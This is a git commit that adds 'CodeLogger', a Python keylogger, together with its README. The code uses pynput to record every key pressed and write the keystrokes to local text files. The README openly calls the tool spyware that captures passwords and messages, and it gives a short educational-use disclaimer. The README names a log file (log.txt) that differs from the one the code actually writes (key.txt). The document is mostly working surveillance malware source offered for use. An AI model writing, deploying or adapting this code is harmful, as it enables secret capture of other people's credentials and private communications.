e2c849c7bb7ed63efa8c77cd7f24bf319e6cbfc9
KARTHIK LAL <karthik.lal558@gmail.com>
2023-10-12 21:48:23 +0530

    CodeLogger: Initial push to repo (V1)
    Signed-off-by: KARTHIK LAL <karthik.lal558@gmail.com>

---
+++ CodeLogger.py
@@ -0,0 +1,69 @@
+# Importing necessary modules
+import os
+import platform
+import time
+from pynput.keyboard import Key, Listener
+
+# Initializing variables
+keys = []
+count = 0
+file_name = "key.txt"
+
+# Checking if file exists
+while os.path.isfile(file_name):
+    count += 1
+    file_name = f"key{count}.txt"
+
+# Function to write to file
+def write_to_file(key):
+    global keys, count
+
+    keys.append(key)
+    if len(keys) >= 10:
+        with open(file_name, "a") as f:
+            for key in keys:
+                k = str(key).replace("'", "")
+                # If the key is a space, write a newline character to the file
+                if k.find("space") > 0:
+                    f.write("\n")
+                # If the key is not a special key, write it to the file
+                elif k.find("Key") == -1:
+                    f.write(k)
+
+            keys = []
+
+# Function to check OS type
+def check_os():
+    # Check if the operating system is Windows or Linux
+    if platform.system() == "Windows":
+        return "win"
+    else:
+        return "lin"
+
+# Function to check key press event
+def on_press(key):
+    try:
+        write_to_file(key)
+    except Exception as e:
+        print(f"Error: {e}")
+
+# Function to check key release event
+def on_release(key):
+    # If the 'Esc' key is pressed, stop logging and exit the program
+    if key == Key.esc:
+        return False
+
+# Main function
+def main():
+    print("Starting CodeLogger....")
+    print("Press 'Esc' to stop logging...")
+
+    # Checking OS type
+    os_type = check_os()
+
+    # Starting listener
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
---
+++ README.md
@@ -0,0 +1,36 @@
+# CodeLogger - Basically a Keylogger with different name
+
+![HEADER](src/codelogger.jpg)
+
+A Codelogger, also known as a keystroke logger, is a type of spyware that monitors and records what you type on your computer or mobile device12. Codelogger work by recording the interactions a user has with their keyboard, allowing someone to access a log of every email, instant message, search query, password, username, or other keyed sequences that a user types2. Codelogger record your keystrokes and send the data they capture back to hackers.
+
+## Table of Contents
+
+- [Prerequisites](#prerequisites)
+- [Usage](#usage)
+- [Precautions](#precautions)
+- [Contributing](#contributing)
+- [License](#license)
+
+## Prerequisites
+- Install the following dependencies:
+  - Python 3
+  - Pynput Module (pip install pynput)
+
+## Usage
+- `git clone https://github.com/karthik558/CodeLogger.git`
+- `cd CodeLogger`
+- `pip install -r requirements.txt` or `pip3 install -r requirements.txt` 
+- `python3 codelogger.py` or `python codelogger.py`
+- Press `Esc` to stop logging.
+- The logged data will be stored in `log.txt` file.
+
+## Precautions
+This script is for educational purposes only and should not be used for any illegal activities. Please use this script only for educational purposes or with the explicit consent of the computer owner.
+
+## Contributing
+Contributions to the project are welcome. If you would like to suggest an improvement or report a bug, please open an issue or submit a pull request.
+
+## License
+
+This project is licensed under the [MIT License](https://opensource.org/licenses/MIT).
